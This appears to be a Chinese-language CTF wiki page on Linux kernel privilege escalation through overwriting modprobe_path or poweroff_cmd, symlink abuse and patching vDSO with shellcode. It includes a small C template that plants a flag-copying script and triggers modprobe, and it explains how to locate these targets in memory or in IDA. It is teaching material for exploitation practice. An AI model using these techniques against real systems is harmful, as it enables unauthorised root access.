# Change Others

如果我們可以改變特權進程的執行軌跡，也可以實現提權。這裏我們從以下角度來考慮如何改變特權進程的執行軌跡。

- 改數據
- 改代碼

## 改數據

這裏給出幾種通過改變特權進程使用的數據來進行提權的方法。

### 符號鏈接

如果一個 root 權限的進程會執行一個符號鏈接的程序，並且該符號鏈接或者符號鏈接指向的程序可以由攻擊者控制，攻擊者就可以實現提權。 

### call_usermodehelper

`call_usermodehelper` 是一種內核線程執行用戶態應用的方式，並且啓動的進程具有 root 權限。因此，如果我們能夠控制具體要執行的應用，那就可以實現提權。在內核中，`call_usermodehelper` 具體要執行的應用往往是由某個變量指定的，因此我們只需要想辦法修改掉這個變量即可。不難看出，這是一種典型的數據流攻擊方法。一般常用的主要有以下幾種方式。

#### 修改 modprobe_path

修改 modprobe_path 實現提權的基本流程如下

1. 獲取 modprobe_path 的地址。
2. 修改 modprobe_path 爲指定的程序。
3. 觸發執行 `call_modprobe `，從而實現提權 。這裏我們可以利用以下幾種方式來觸發
    1. 執行一個非法的可執行文件。非法的可執行文件需要滿足相應的要求（參考 call_usermodehelper 部分的介紹）。
    2. 使用未知協議來觸發。

這裏我們也給出使用 modprobe_path 的模板。

```c
// step 1. modify modprobe_path to the target value

// step 2. create related file
system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag' > /home/pwn/catflag.sh");
system("chmod +x /home/pwn/catflag.sh");

// step 3. trigger it using unknown executable
system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");
system("chmod +x /home/pwn/dummy");
system("/home/pwn/dummy");

// step 3. trigger it using unknown protocol
socket(AF_INET,SOCK_STREAM,132);
```

在這個過程中，我們着重關注下如何定位 modprobe_path。

##### 直接定位

由於 modprobe_path 的取值是確定的，所以我們可以直接掃描內存，尋找對應的字符串。這需要我們具有掃描內存的能力。

##### 間接定位

考慮到 modprobe_path 相對於內核基地址的偏移是固定的，我們可以先獲取到內核的基地址，然後根據相對偏移來得到 modprobe_path 的地址。

#### 修改 poweroff_cmd

1. 修改 poweroff_cmd 爲指定的程序。
2. 劫持控制流執行 `__orderly_poweroff`。

關於如何定位 poweroff_cmd，我們可以採用類似於定位 `modprobe_path` 的方法。

## 改代碼

在程序運行時，如果我們可以修改 root 權限進程執行的代碼，那其實我們也可以實現提權。

### 修改 vDSO 代碼

內核中 vDSO 的代碼會被映射到所有的用戶態進程中。如果有一個高特權的進程會週期性地調用 vDSO 中的函數，那我們可以考慮把 vDSO 中相應的函數修改爲特定的 shellcode。當高權限的進程執行相應的代碼時，我們就可以進行提權。

在早期的時候，Linux 中的 vDSO 是可寫的，考慮到這樣的風險，Kees Cook 提出引入 `post-init read-only` 的數據，即將那些初始化後不再被寫的數據標記爲只讀，來防禦這樣的利用。

在引入之前，vDSO 對應的 raw_data 只是標記了對齊屬性。

```c
	fprintf(outfile, "/* AUTOMATICALLY GENERATED -- DO NOT EDIT */\n\n");
	fprintf(outfile, "#include <linux/linkage.h>\n");
	fprintf(outfile, "#include <asm/page_types.h>\n");
	fprintf(outfile, "#include <asm/vdso.h>\n");
	fprintf(outfile, "\n");
	fprintf(outfile,
		"static unsigned char raw_data[%lu] __page_aligned_data = {",
		mapping_size);
```

引入之後，vDSO 對應的 raw_data 則被標記爲了初始化後只讀。

```c
	fprintf(outfile, "/* AUTOMATICALLY GENERATED -- DO NOT EDIT */\n\n");
	fprintf(outfile, "#include <linux/linkage.h>\n");
	fprintf(outfile, "#include <asm/page_types.h>\n");
	fprintf(outfile, "#include <asm/vdso.h>\n");
	fprintf(outfile, "\n");
	fprintf(outfile,
		"static unsigned char raw_data[%lu] __ro_after_init __aligned(PAGE_SIZE) = {",
		mapping_size);
```

通過修改 vDSO 進行提權的基本方式如下

- 定位 vDSO
- 修改 vDSO 的特定函數爲指定的 shellcode
- 等待觸發執行 shellcode

這裏我們着重關注下如何定位 vDSO。

#### ida 裏定位

這裏我們介紹一下如何在 vmlinux 中找到 vDSO 的位置。

1. 在 ida 裏定位 init_vdso 函數的地址

```c
__int64 init_vdso()
{
  init_vdso_image(&vdso_image_64 + 0x20000000);
  init_vdso_image(&vdso_image_x32 + 0x20000000);
  cpu_maps_update_begin();
  on_each_cpu((char *)startup_64 + 0x100003EA0LL, 0LL, 1LL);
  _register_cpu_notifier(&sdata + 536882764);
  cpu_maps_update_done();
  return 0LL;
}
```

2. 可以看到 `vdso_image_64` 和 `vdso_image_x32`。以`vdso_image_64` 爲例，點到該變量的地址

```
.rodata:FFFFFFFF81A01300                 public vdso_image_64
.rodata:FFFFFFFF81A01300 vdso_image_64   dq offset raw_data      ; DATA XREF: arch_setup_additional_pages+18↑o
.rodata:FFFFFFFF81A01300                                         ; init_vdso+1↓o
```

3. 點擊 `raw_data` 即可知道 64 位 vDSO 在內核鏡像中的地址，可以看到，vDSO 確實是以頁對齊的。

```
.data:FFFFFFFF81E04000 raw_data        db  7Fh ;              ; DATA XREF: .rodata:vdso_image_64↑o
.data:FFFFFFFF81E04001                 db  45h ; E
.data:FFFFFFFF81E04002                 db  4Ch ; L
.data:FFFFFFFF81E04003                 db  46h ; F
```

從最後的符號來看，我們也可以直接使用 `raw_data` 來尋找 vDSO。

#### 內存中定位

##### 直接定位

vDSO 其實是一個 ELF 文件，具有 ELF 文件頭。同時，vDSO 中特定位置存儲着導出函數的字符串。因此我們可以根據這兩個特徵來掃描內存，定位 vDSO 的位置。

##### 間接定位

考慮到 vDSO 相對於內核基地址的偏移是固定的，我們可以先獲取到內核的基地址，然後根據相對偏移來得到 vDSO 的地址。

#### 參考

- https://lwn.net/Articles/676145/
- https://lwn.net/Articles/666550/





